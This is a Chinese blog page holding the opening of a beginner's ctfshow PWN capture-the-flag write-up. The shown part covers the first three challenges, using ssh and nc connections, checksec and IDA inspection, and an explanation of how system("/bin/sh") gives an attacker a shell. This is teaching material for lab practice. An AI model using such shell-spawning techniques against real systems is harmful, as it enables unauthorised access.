<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题">
<title>ctfshow-pwn-writeup</title>

<link rel='canonical' href='https://expl0rer.top/p/ctfshow-pwn-writeup/'>

<link rel="stylesheet" href="/scss/style.min.2c77b19359813276c65acd84dec34da71ed0ee906a8812f34e2c2899887b4ce7.css"><meta property='og:title' content="ctfshow-pwn-writeup">
<meta property='og:description' content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题">
<meta property='og:url' content='https://expl0rer.top/p/ctfshow-pwn-writeup/'>
<meta property='og:site_name' content='Expl0rer.Ct'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-02T00:04:55&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
<meta name="twitter:title" content="ctfshow-pwn-writeup">
<meta name="twitter:description" content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<div class="loading">
     
    <div id="ghost">
        <div id="red">
            <div id="pupil"></div>
            <div id="pupil1"></div>
            <div id="eye"></div>
            <div id="eye1"></div>
            <div id="top0"></div>
            <div id="top1"></div>
            <div id="top2"></div>
            <div id="top3"></div>
            <div id="top4"></div>
            <div id="st0"></div>
            <div id="st1"></div>
            <div id="st2"></div>
            <div id="st3"></div>
            <div id="st4"></div>
            <div id="st5"></div>
            <div id="an1"></div>
            <div id="an2"></div>
            <div id="an3"></div>
            <div id="an4"></div>
            <div id="an5"></div>
            <div id="an6"></div>
            <div id="an7"></div>
            <div id="an8"></div>
            <div id="an9"></div>
            <div id="an10"></div>
            <div id="an11"></div>
            <div id="an12"></div>
            <div id="an13"></div>
            <div id="an14"></div>
            <div id="an15"></div>
            <div id="an16"></div>
            <div id="an17"></div>
            <div id="an18"></div>
        </div>
        <div id="shadow"></div>
    </div>
</div>

<style>
    .loading {
        position: fixed;
        display: flex;
        justify-content: center;
        align-items: center;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99;
        background-color: #f5f5fa;
        transition: opacity 0.5s ease;
    }
	
      
#ghost {
  position: relative;
  scale: 0.8;
}

#red {
  animation: upNDown infinite 1s;
  position: relative;
  width: 140px;
  height: 140px;
  display: grid;
  grid-template-columns: repeat(14, 1fr);
  grid-template-rows: repeat(14, 1fr);
  grid-column-gap: 0px;
  grid-row-gap: 0px;
  grid-template-areas:
    "a1  a2  a3  a4  a5  top0  top0  top0  top0  a10 a11 a12 a13 a14"
    "b1  b2  b3  top1 top1 top1 top1 top1 top1 top1 top1 b12 b13 b14"
    "c1 c2 top2 top2 top2 top2 top2 top2 top2 top2 top2 top2 c13 c14"
    "d1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 d14"
    "e1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 e14"
    "f1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 f14"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "st0 st0 an4 st1 an7 st2 an10 an10 st3 an13 st4 an16 st5 st5"
    "an1 an2 an3 an5 an6 an8 an9 an9 an11 an12 an14 an15 an17 an18";
}

@keyframes upNDown {
  0%,
  49% {
    transform: translateY(0px);
  }
  50%,
  100% {
    transform: translateY(-10px);
  }
}

#top0,
#top1,
#top2,
#top3,
#top4,
#st0,
#st1,
#st2,
#st3,
#st4,
#st5 {
  background-color: red;
}

#top0 {
  grid-area: top0;
}

#top1 {
  grid-area: top1;
}

#top2 {
  grid-area: top2;
}

#top3 {
  grid-area: top3;
}

#top4 {
  grid-area: top4;
}

#st0 {
  grid-area: st0;
}

#st1 {
  grid-area: st1;
}

#st2 {
  grid-area: st2;
}

#st3 {
  grid-area: st3;
}

#st4 {
  grid-area: st4;
}

#st5 {
  grid-area: st5;
}

#an1 {
  grid-area: an1;
  animation: flicker0 infinite 1s;
}

#an18 {
  grid-area: an18;
  animation: flicker0 infinite 1s;
}

#an2 {
  grid-area: an2;
  animation: flicker1 infinite 1s;
}

#an17 {
  grid-area: an17;
  animation: flicker1 infinite 1s;
}

#an3 {
  grid-area: an3;
  animation: flicker1 infinite 1s;
}

#an16 {
  grid-area: an16;
  animation: flicker1 infinite 1s;
}

#an4 {
  grid-area: an4;
  animation: flicker1 infinite 1s;
}

#an15 {
  grid-area: an15;
  animation: flicker1 infinite 1s;
}

#an6 {
  grid-area: an6;
  animation: flicker0 infinite 1s;
}

#an12 {
  grid-area: an12;
  animation: flicker0 infinite 1s;
}

#an7 {
  grid-area: an7;
  animation: flicker0 infinite 1s;
}

#an13 {
  grid-area: an13;
  animation: flicker0 infinite 1s;
}

#an9 {
  grid-area: an9;
  animation: flicker1 infinite 1s;
}

#an10 {
  grid-area: an10;
  animation: flicker1 infinite 1s;
}

#an8 {
  grid-area: an8;
  animation: flicker0 infinite 1s;
}

#an11 {
  grid-area: an11;
  animation: flicker0 infinite 1s;
}

@keyframes flicker0 {
  0%,
  49% {
    background-color: red;
  }
  50%,
  100% {
    background-color: transparent;
  }
}

@keyframes flicker1 {
  0%,
  49% {
    background-color: transparent;
  }
  50%,
  100% {
    background-color: red;
  }
}

#eye {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  left: 10px;
}

#eye::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#eye1 {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  right: 30px;
}

#eye1::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye1::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#pupil {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  left: 10px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

#pupil1 {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  right: 50px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

@keyframes eyesMovement {
  0%,
  49% {
    transform: translateX(0px);
  }
  50%,
  99% {
    transform: translateX(10px);
  }
  100% {
    transform: translateX(0px);
  }
}

#shadow {
  background-color: black;
  width: 140px;
  height: 140px;
  position: absolute;
  border-radius: 50%;
  transform: rotateX(80deg);
  filter: blur(20px);
  top: 80%;
  animation: shadowMovement infinite 1s;
}

@keyframes shadowMovement {
  0%,
  49% {
    opacity: 0.5;
  }
  50%,
  100% {
    opacity: 0.2;
  }
}

</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>

<script>	
    function initLoading() {
        let loading = document.querySelector(".loading");
        document.addEventListener('DOMContentLoaded', function() {
            
            setTimeout(() => {
                loading.style.opacity = "0";
                
                setTimeout(() => {
                    loading.style.display = "none";
                }, 500);
            }, 500); 
        });
    }

    initLoading();
</script>


<link
  rel="stylesheet"
  href="https://cdn-font.hyperos.mi.com/font/css?family=MiSans:400:Chinese_Simplify,Latin&display=swap"
/>



<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreenr.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreenr.css" />


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1a3c99934e119e1b.png" width="300"
                            height="268" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">🫡</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Expl0rer.Ct</a></h1>
            <h2 class="site-description">吾将上下而求索</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/695179979?spm_id_from=333.40138.0.0'
                        target="_blank"
                        title="Bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/Expl0rer-Ct'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页 | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>关于 | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>归档 | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>搜索 | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>技术链接 | Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <!--
tags: [temperature, hot, wheater, thermometer, forecast]
category: Weather
version: "1.73"
unicode: "f236"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#ff9500"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-sun-high"
>
  <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" />
  <path d="M6.343 17.657l-1.414 1.414" />
  <path d="M6.343 6.343l-1.414 -1.414" />
  <path d="M17.657 6.343l1.414 -1.414" />
  <path d="M17.657 17.657l1.414 1.414" />
  <path d="M4 12h-2" />
  <path d="M12 4v-2" />
  <path d="M20 12h2" />
  <path d="M12 20v2" />
</svg>

                        <!--
tags: [night, dark mode]
category: Weather
version: "1.21"
unicode: "ece7"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#8d6e63"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-moon-stars"
>
  <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
  <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2" />
  <path d="M19 11h2m-1 -1v2" />
</svg>

                        <span>暗色模式</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#test_your_nc">Test_your_nc</a>
      <ol>
        <li><a href="#pwn_000">PWN_000</a>
          <ol>
            <li><a href="#解题过程">解题过程</a></li>
          </ol>
        </li>
        <li><a href="#pwn_001">PWN_001</a></li>
        <li><a href="#pwn_002">PWN_002</a></li>
        <li><a href="#pwn_003">PWN_003</a></li>
        <li><a href="#pwn_004">PWN_004</a></li>
      </ol>
    </li>
    <li><a href="#前置基础">前置基础</a>
      <ol>
        <li><a href="#pwn_005">PWN_005</a></li>
        <li><a href="#pwn_006">PWN_006</a></li>
        <li><a href="#pwn_007">PWN_007</a></li>
        <li><a href="#pwn_008">PWN_008</a></li>
        <li><a href="#pwn_009">PWN_009</a></li>
        <li><a href="#pwn_010">PWN_010</a></li>
        <li><a href="#pwn_011">PWN_011</a></li>
        <li><a href="#pwn_012">PWN_012</a></li>
        <li><a href="#pwn_013">PWN_013</a></li>
        <li><a href="#pwn_014">PWN_014</a></li>
        <li><a href="#pwn_015">PWN_015</a></li>
        <li><a href="#pwn_016">PWN_016</a></li>
        <li><a href="#pwn_017">PWN_017</a></li>
        <li><a href="#pwn_018">PWN_018</a></li>
        <li><a href="#pwn_019">PWN_019</a></li>
        <li><a href="#pwn_020">PWN_020</a></li>
        <li><a href="#pwn_021">PWN_021</a></li>
        <li><a href="#pwn_021-1">PWN_021</a></li>
        <li><a href="#pwn_023">PWN_023</a></li>
        <li><a href="#pwn_024">PWN_024</a>
          <ol>
            <li><a href="#题目">题目：</a></li>
            <li><a href="#与目标程序交互">与目标程序交互</a></li>
            <li><a href="#二进制数据处理">二进制数据处理</a></li>
            <li><a href="#辅助漏洞利用">辅助漏洞利用</a></li>
            <li><a href="#密码学相关辅助">密码学相关辅助</a></li>
            <li><a href="#多线程和异步支持">多线程和异步支持</a></li>
            <li><a href="#题目后续">题目后续：</a></li>
            <li><a href="#逐行解析手敲shellcode">逐行解析手敲shellcode</a></li>
          </ol>
        </li>
        <li><a href="#pwn_025待定">PWN_025（待定）</a>
          <ol>
            <li><a href="#ret2libc实现步骤">ret2libc实现步骤</a></li>
          </ol>
        </li>
        <li><a href="#pwn_026">PWN_026</a></li>
        <li><a href="#pwn_027">PWN_027</a></li>
        <li><a href="#pwn_028">PWN_028</a></li>
        <li><a href="#pwn_029">PWN_029</a></li>
        <li><a href="#pwn_030">PWN_030</a></li>
        <li><a href="#pwn_031待定">PWN_031（待定）</a></li>
        <li><a href="#fortify缓冲区边界检查"><strong>FORTIFY缓冲区边界检查</strong></a></li>
        <li><a href="#pwn_032">PWN_032</a></li>
        <li><a href="#pwn_033">PWN_033</a></li>
        <li><a href="#pwn_034">PWN_034</a></li>
      </ol>
    </li>
    <li><a href="#栈溢出">栈溢出</a>
      <ol>
        <li><a href="#pwn_035">PWN_035</a></li>
        <li><a href="#binsh地址的跳转利用"><strong>/bin/sh地址的跳转利用</strong></a></li>
        <li><a href="#pwn_036">PWN_036</a></li>
        <li><a href="#pwn_037">PWN_037</a></li>
        <li><a href="#pwn_038">PWN_038</a></li>
        <li><a href="#pwn_039">PWN_039</a></li>
        <li><a href="#pwn_040">PWN_040</a></li>
        <li><a href="#32位和64位可执行程序的参数传递顺序"><strong>32位和64位可执行程序的参数传递顺序</strong></a></li>
        <li><a href="#pwn_041">PWN_041</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/ctfshow-pwn-writeup/">
                <img src="/p/ctfshow-pwn-writeup/ctfshow_hu_2da768fbb28f8f82.png"
                        srcset="/p/ctfshow-pwn-writeup/ctfshow_hu_2da768fbb28f8f82.png 800w, /p/ctfshow-pwn-writeup/ctfshow_hu_ecf2a63f33ea59e3.png 1600w"
                        width="800" 
                        height="405" 
                        loading="lazy"
                        alt="Featured image of post ctfshow-pwn-writeup" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
                CTF_writeup
            </a>
        
            <a href="/categories/ctfpwn/" style="background-color: #2a9d8f; color: #fff;">
                CTFpwn
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ctfshow-pwn-writeup/">ctfshow-pwn-writeup</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            二进制漏洞与利用，PWN_wrtieup，会员套餐360题
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-08-27</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>[TOC]</p>
<p>**前文：以下是我<a class="link" href="https://ctf.show/challenges"  target="_blank" rel="noopener"
    >ctfshow</a>的PWN做题记录，欢迎各位前来观看，小弟领教！**还有就是ctfshow-pwn是我入门PWN的第一套题，比较基础，看官方writeup可以知道比较简洁，但有些我看不懂，这是我自己做的过程中写的，都是发自内心理解它们的话，有些可能比较啰嗦，但也必须这样，因为站在新手角度来看必须要这种啰嗦方式去理解才能更深刻，有耐心的朋友可以一直看下去，当然也欢迎PWN大佬前来挑战我！！！😄</p>
<h2 id="test_your_nc">Test_your_nc
</h2><h3 id="pwn_000">PWN_000
</h3><p><a class="link" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ"  target="_blank" rel="noopener"
    >专用虚拟机镜像</a>，全套在这里，提取码show；虚拟机镜像，用户名为ctfshow，密码是ctfshow。</p>
<p>看了课也啥都不会或者工具不会下看这&ndash;&gt;<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/"  target="_blank" rel="noopener"
    >CTF Wiki-PWN</a></p>
<h4 id="解题过程">解题过程
</h4><p>ssh连接（记得给虚拟机kali\Ubuntu或者主机设置打开SSH）：</p>
<p><code>ssh ctfshow@pwn.challenge.ctf.show -pxxxx</code></p>
<p>一开始会让你输入yes/no的，直接yes，然后输入密码，等进程结束会有个交互shell</p>
<p><img src="/p/ctfshow-pwn-writeup/1.png"
	width="1184"
	height="570"
	srcset="/p/ctfshow-pwn-writeup/1_hu_dff3e732402d7aaa.png 480w, /p/ctfshow-pwn-writeup/1_hu_5121a93a292ddbe4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="498px"
	
></p>
<p>用命令ls打开看一下有啥文件，看到有个ctfshow_flag的文件，猜是个装flag的文件夹，直接用cat命令打开就好。注意斜杠/。</p>
<h3 id="pwn_001">PWN_001
</h3><p>题目 <a class="link" href="PWN_001" >PWN_001</a> ：提供后门函数，连上即可得到flag</p>
<p>这里有用到“<a class="link" href="https://ctf.xidian.edu.cn/wiki/13"  target="_blank" rel="noopener"
    ><code>nc</code></a>”连接，可以了解一下，方便后续做题。当然Kali自带nc连接的，你用Kali干PWN也行。</p>
<p><img src="/p/ctfshow-pwn-writeup/2.png"
	width="826"
	height="310"
	srcset="/p/ctfshow-pwn-writeup/2_hu_d89a142dd65a19e2.png 480w, /p/ctfshow-pwn-writeup/2_hu_5516dc48b2b77e6e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="266"
		data-flex-basis="639px"
	
></p>
<p>这题送分的，nc连接一下就爆flag了。</p>
<p>不过说实话我是真不知道PWN_001文件给来干嘛的，直接nc交互一下就出flag了，这题没搞懂ctfshow意图在哪。</p>
<p><img src="/p/ctfshow-pwn-writeup/3.png"
	width="1010"
	height="246"
	srcset="/p/ctfshow-pwn-writeup/3_hu_e6fbe5354a4e4e53.png 480w, /p/ctfshow-pwn-writeup/3_hu_9234984ec0f35806.png 1024w"
	loading="lazy"
	
		alt="checksec解析elf格式信息、二进制文件保护配置"
	
	
		class="gallery-image" 
		data-flex-grow="410"
		data-flex-basis="985px"
	
></p>
<p>不过我用了下刚学的指令checksec看了看ELF文件信息，发现是没开canary保护的，可以利用栈溢出漏洞&hellip;</p>
<p>可以看到是64位仅关闭Canary保护。</p>
<p>接着用64位IDA打开查看main函数（按F5进入反汇编）：</p>
<p><img src="/p/ctfshow-pwn-writeup/4.png"
	width="1375"
	height="790"
	srcset="/p/ctfshow-pwn-writeup/4_hu_2ae06a810be6f21f.png 480w, /p/ctfshow-pwn-writeup/4_hu_8b6f5df4cd345cc8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="174"
		data-flex-basis="417px"
	
></p>
<p>怪不得直接爆flag出来呢。后门system函数直接运行了。</p>
<h3 id="pwn_002">PWN_002
</h3><p>题目： <a class="link" href="PWN_002" >PWN_002</a> 给你一个shell，这次需要你自己去获得flag</p>
<p>到这里度过新手期了。</p>
<p><img src="/p/ctfshow-pwn-writeup/5.png"
	width="765"
	height="260"
	srcset="/p/ctfshow-pwn-writeup/5_hu_e343e2a59c5e743.png 480w, /p/ctfshow-pwn-writeup/5_hu_4937eed7794a387b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="294"
		data-flex-basis="706px"
	
></p>
<p>这里需要我们输入指令了，一般来说做题习惯看到这样直接ls秒的，不过像我这样入门级别的还得用IDA琢磨琢磨：</p>
<p><img src="/p/ctfshow-pwn-writeup/8.png"
	width="640"
	height="160"
	srcset="/p/ctfshow-pwn-writeup/8_hu_5bc43d6c8900b4ef.png 480w, /p/ctfshow-pwn-writeup/8_hu_e468d492633fbadf.png 1024w"
	loading="lazy"
	
		alt="checksec分析"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="960px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/6.png"
	width="1374"
	height="555"
	srcset="/p/ctfshow-pwn-writeup/6_hu_540555b971908944.png 480w, /p/ctfshow-pwn-writeup/6_hu_a88e21f83ae2c018.png 1024w"
	loading="lazy"
	
		alt="IDA-x64位main程序的反编译"
	
	
		class="gallery-image" 
		data-flex-grow="247"
		data-flex-basis="594px"
	
></p>
<p>可以看到是没canary保护的</p>
<p><img src="/p/ctfshow-pwn-writeup/7.png"
	width="909"
	height="484"
	srcset="/p/ctfshow-pwn-writeup/7_hu_6dedf0753937e2ce.png 480w, /p/ctfshow-pwn-writeup/7_hu_4bed3d833e192498.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="450px"
	
></p>
<p>看到这里有个疑问，为什么system有这么大威力？，这次system里边是一个/bin/sh的软链接，很类似我们的文件地址</p>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>system(&quot;/bin/sh&quot;);</code> 是漏洞利用中获取系统 shell 的核心操作，其工作原理涉及<strong>函数调用</strong>、<strong>系统调用</strong>和<strong>进程创建</strong>三个层次，本质是通过标准库函数 <code>system</code> 启动一个 <code>/bin/sh</code> 进程（即命令行解释器），让攻击者获得交互权限。</p></blockquote></blockquote>
<p><code>system</code> 是 C 标准库（libc）中的函数，原型为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">system</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">command</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-error">
    <blockquote>
<p>它的功能是<strong>执行参数 <code>command</code> 指向的字符串作为系统命令</strong>，相当于在终端中输入该命令并执行。</p></blockquote></blockquote>
